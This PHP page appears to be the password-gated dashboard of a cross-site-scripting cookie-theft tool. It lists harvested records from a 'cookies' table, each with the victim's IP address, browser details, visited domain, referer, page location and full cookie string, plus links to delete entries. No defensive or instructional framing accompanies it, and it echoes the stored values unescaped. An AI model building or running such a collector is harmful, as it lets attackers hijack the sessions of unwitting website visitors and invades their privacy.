<?php
    session_start();
    ini_set('date.timezone', 'Asia/Shanghai');
    @require('mysql.class.php');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>cookies</title>
</head>
<body>
    <table border='1' width='70%' style="margin:0 auto;margin-top:50px;">
        <tr>
            <th width='95%'>Data</th>
            <th width='5%'>Opt</th>
        </tr>

        <?php
            if (@$_SESSION['pass']) {
                $db = new mysql();
                $result = $db->select_more('cookies','*','order by id desc');
                $_SESSION['token'] = md5(time().rand(100,999));

                foreach($result as $key => $value){
                    echo "<tr>";
                        echo "<td width='95%'>";
                            echo "Date: ".date('Y-m-d H:i:s',$value['date'])."<br>";
                            echo "IP: ".$value['ip']."<br>";
                            echo "Screen: ".$value['screen']."<br>";
                            echo "Browser: ".$value['browser']."<br>";
                            echo "Flash: ".$value['flash']."<br>";
                            echo "User-Agent: ".$value['useragent']."<br>";
                            echo "Domain: ".$value['domain']."<br>";
                            echo "Title: ".$value['title']."<br>";
                            echo "Lang: ".$value['lang']."<br>";
                            echo "Referer: ".$value['referer']."<br>";
                            echo "Location: ".$value['location']."<br>";
                            echo "TopLocation: ".$value['toplocation']."<br>";
                            echo "Cookie: ".$value['cookie']."<br>";
                        echo "</td>";
                        echo "<td width='5%'><a href='del.php?id={$value['id']}&token={$_SESSION['token']}'>Delete</a></td>";
                    echo "</tr>";
                }
            } else {
                die("<script>location.href='index.php';</script>");
            }
        ?>
    </table>
</body>
</html>


